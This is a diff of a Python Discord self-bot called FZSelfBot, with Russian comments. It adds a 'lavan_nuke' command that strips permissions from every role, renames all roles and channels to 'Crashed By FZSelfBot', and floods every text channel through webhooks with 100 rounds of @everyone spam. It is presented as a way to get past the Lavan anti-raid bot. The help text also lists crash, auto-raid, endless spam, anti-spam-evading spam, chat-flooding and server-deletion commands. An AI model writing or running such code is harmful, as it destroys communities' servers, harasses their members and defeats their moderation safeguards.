@@ -22,14 +22,39 @@ import requests as rq
 import os
 import random
 from random import choice
+from discord import Permissions
+from deep_translator import GoogleTranslator
 # импортируем важные библы
+
+# настройки, не трогаем
 crashed = []
-v = '1.0.0'
+v = '1.1.0'
+version = 110
+url = 'https://raw.githubusercontent.com/forzel-new/selfbot/main/version.txt'
+
+# anti-lavan crash
+global channelname,rolename,reasonb
+channelname = 'Crashed By FZSelfBot'
+rolename = 'Crashed By FZSelfBot'
+reasonb = 'Сервер крашнут ботом Anti-Lavan'
+
+#тож не трогаем, проверка обновлений
+def check():
+	new = rq.get(url)
+	global upd
+	br = int(new.text) - int(version)
+	if br <= 0:
+		upd = False
+	else:
+		upd = True
+
+check()
 
 client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), self_bot=True)
 # создаем переменную бота
 client.remove_command('help')
 
+# эта хрень для спама, не трогать
 global spam
 spam = True
 
@@ -39,10 +64,145 @@ async def on_ready():
 	print(f'[ FZSelfBot ] Для просмотра списка команд введите {prefix}help')
 
 @client.command()
+async def updates(ctx):
+	if upd == True:
+		t = 'были найдены. Пожалуйста, обновите селф-бота до новой версии!\n[Скачать обновление](https://github.com/forzel-new/selfbot)'
+	else:
+		t = 'не были найдены. Вы пользуетесь самой новой версией!'
+
+	embed = discord.Embed(
+		title = f'FZSelfBot {v}',
+		description = f'Обновления {t}',
+		colour = discord.Colour.from_rgb(111,228,55)
+	)
+	await ctx.send(embed=embed)
+
+@client.command()
+async def lavan_nuke(ctx):
+    for role in ctx.guild.roles:
+        try:
+            perms = Permissions()
+            perms.update(read_messages=False, ban_members=False, kick_members=False, send_messages=False, create_instant_invite=False, administrator=False, manage_channels=False, manage_guild=False, add_reactions=False, view_audit_log=False, priority_speaker=False, stream=False, view_channel=False, send_tts_messages=False, manage_messages=False, embed_links=False, attach_files=False, read_message_history=False, mention_everyone=False, external_emojis=False, use_external_emojis=False, view_guild_insights=False, connect=False, speak=False, mute_members=False, deafen_members=False, move_members=False, use_voice_activation=False, change_nickname=False, manage_nicknames=False, manage_roles=False, manage_permissions=False, manage_webhooks=False, manage_emojis=False, use_slash_commands=False, request_to_speak=False)
+            await role.edit(name=rolename, permissions=perms)
+        except:
+            pass
+        else:
+            pass
+
+    for channel in ctx.guild.channels:
+        try:
+            await channel.edit(name=channelname)
+        except:
+            pass
+        else:
+            pass
+
+    for ch in ctx.guild.text_channels:
+        try:
+            h = await ch.create_webhook(name='Crashed')
+        except:
+            pass
+
+    for i in range(100):
+        for channelt in ctx.guild.text_channels:
+            hooks = await channelt.webhooks()
+            for hook in hooks:
+                await hook.send('@everyone @here Данный сервер крашится селф-ботом fzselfbot')
+
+@client.command()
+async def translate(ctx, lang='help', *, text=''):
+	if lang == 'help' or text in ['', ' ']:
+		embed = discord.Embed(
+			title = f'Error',
+			description = f'Правильное использование команды:\n```py\n{prefix}translate [ язык на который перевести ] [ текст ]```\nДоступные языки:\n`ru` - русский\n`en` - английский\n`arabic` - арабский\n`uk` - украинский',
+			colour = discord.Colour.from_rgb(222,44,111)
+		)
+		await ctx.send(embed=embed)
+	else:
+		emb = discord.Embed(
+			title = f'Неверно указан язык',
+			description = f'Введите команду `{prefix}translate help`',
+			colour = discord.Colour.from_rgb(222,2,11)
+		)
+		if lang in ['arabic', 'en', 'ru', 'uk']:
+			stard = time.time()
+			embed = discord.Embed(
+			title = 'Google Translator',
+			description = f'Перевожу текст `{text}`...',
+			colour = discord.Colour.from_rgb(100,100,228)
+			)
+			msg = await ctx.send(embed=embed)
+			translated = GoogleTranslator(source='auto', target=lang).translate(text)
+			ended = time.time()
+			itogo = ended - stard
+			embed = discord.Embed(
+			title = 'Google Translator',
+			description = f'Текст: `{text}`\nПеревод: `{translated}`\nПереведено за {round(itogo, 3)} секунд',
+			colour = discord.Colour.from_rgb(100,100,228)
+			)
+			await msg.edit(embed=embed)
+		else:
+			await ctx.send(embed=emb)
+
+@client.command()
+async def kick(ctx, user:discord.Member=None):
+	if user == None:
+		embed = discord.Embed(
+			title = 'Ошибка',
+			description = f'Укажите пользователя для кика!',
+			colour = discord.Colour.from_rgb(0,222,0)
+		)
+		await ctx.send(embed=embed)
+	else:
+		try:
+			await ctx.guild.kick(user)
+		except:
+			embed=discord.Embed(
+				title = 'Ошибка',
+				description = 'Я не смог кикнуть этого пользователя!',
+				colour = discord.Colour.from_rgb(123,10,144)
+			)
+		else:
+			embed = discord.Embed(
+				title = 'Кик :boot:',
+				description = f'Пользователь `{user}` был кикнут',
+				colour = discord.Colour.from_rgb(255,0,0)
+			)
+
+		await ctx.send(embed=embed)
+
+@client.command()
+async def ban(ctx, user:discord.Member=None):
+	if user == None:
+		embed = discord.Embed(
+			title = 'Ошибка',
+			description = f'Укажите пользователя для бана!',
+			colour = discord.Colour.from_rgb(0,222,0)
+		)
+		await ctx.send(embed=embed)
+	else:
+		try:
+			await ctx.guild.ban(user)
+		except:
+			embed=discord.Embed(
+				title = 'Ошибка',
+				description = 'Я не смог забанить этого пользователя!',
+				colour = discord.Colour.from_rgb(123,10,144)
+			)
+		else:
+			embed = discord.Embed(
+				title = 'Кик :boot:',
+				description = f'Пользователь `{user}` был забанен',
+				colour = discord.Colour.from_rgb(255,0,0)
+			)
+
+		await ctx.send(embed=embed)
+
+@client.command()
 async def help(ctx):
 	embed = discord.Embed(
 		title = f'FZSelfBot {v} | GitHub Version',
-		description = f'`{prefix}getlink` - выдаст ссылку на скачивание файлов селф-бота\n`{prefix}say [ текст ]` - отправить сообщение в эмбеде\n`{prefix}echo [ текст ]` - отправить сообщение в эмбеде с рандомным цветом\n`{prefix}ping` - проверить пинг селф-бота\n`{prefix}create_guild [ имя ]` - создать сервер и удалить на нём все каналы\n`{prefix}crash` - авто краш сервера\n`{prefix}delguild` - удалить текущий сервер (если есть права)\n`{prefix}spam [ Текст ]` - бесконечный спам вашим текстом\n`{prefix}stop` - остановить спам\n`{prefix}spamv2 [ кол-во сообщений ] [ текст ]` - спам текстом в обход 90% анти-спам систем\n`{prefix}killchat [ кол-во сообщений ]` - засорить чат, так что будет просто черный экран\n`{prefix}autoraid` - автоматический рейд сервера\n`{prefix}status [ тип статуса ] [ текст ]` - установить статус\n`{prefix}hack` - клонирование текущего сервера\n`{prefix}popit` - отправить поп ит в чат\n`{prefix}ball [ вопрос ]` - задать вопрос магическому шару',
+		description = f'`{prefix}getlink` - выдаст ссылку на скачивание файлов селф-бота\n`{prefix}say [ текст ]` - отправить сообщение в эмбеде\n`{prefix}echo [ текст ]` - отправить сообщение в эмбеде с рандомным цветом\n`{prefix}ping` - проверить пинг селф-бота\n`{prefix}create_guild [ имя ]` - создать сервер и удалить на нём все каналы\n`{prefix}crash` - авто краш сервера\n`{prefix}delguild` - удалить текущий сервер (если есть права)\n`{prefix}spam [ Текст ]` - бесконечный спам вашим текстом\n`{prefix}stop` - остановить спам\n`{prefix}spamv2 [ кол-во сообщений ] [ текст ]` - спам текстом в обход 90% анти-спам систем\n`{prefix}killchat [ кол-во сообщений ]` - засорить чат, так что будет просто черный экран\n`{prefix}autoraid` - автоматический рейд сервера\n`{prefix}status [ тип статуса ] [ текст ]` - установить статус\n`{prefix}hack` - клонирование текущего сервера\n`{prefix}popit` - отправить поп ит в чат\n`{prefix}ball [ вопрос ]` - задать вопрос магическому шару\n`{prefix}updates` - проверить наличие обновлений\n`{prefix}lavan_nuke` - краш сервера в обход лавана\n`{prefix}translate [ язык на который перевести ] [ текст ]` - перевести текст на указанный язык. Список всех языков: `{prefix}translate help`\n`{prefix}kick @пользователь` - кикнуть пользователя с сервера\n`{prefix}ban @пользователь` - забанить пользователя на сервере',
 		colour = discord.Colour.from_rgb(111,228,55)
 	)
 	embed.set_footer(text=f'FZSelfBot {v}', icon_url='https://yt3.ggpht.com/0x2AH-dWTYTfIyuiMTWcDFgBOTRjfZZx0cdEf0xRTEer9xmFJS53zXgHH86V6UPh2r9gYjGQC4k=s88-c-k-c0x00ffffff-no-rj')
